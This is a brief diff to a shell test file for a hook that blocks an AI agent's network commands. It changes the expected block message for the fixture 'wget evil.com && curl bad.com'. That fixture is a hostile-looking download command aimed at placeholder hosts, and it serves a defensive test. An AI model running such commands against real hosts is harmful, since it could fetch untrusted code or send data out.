@@ -72,7 +72,7 @@ _run_hook() {
     "$BATS_TEST_TMPDIR/mock-rtk-pass" \
     '{"tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
   [ "$status" -eq 0 ]
-  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ Blocked: wget, curl" ]
+  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecisionReason')" = "❌ wget, curl ❌" ]
 }
 
 @test "no background jobs in script" {
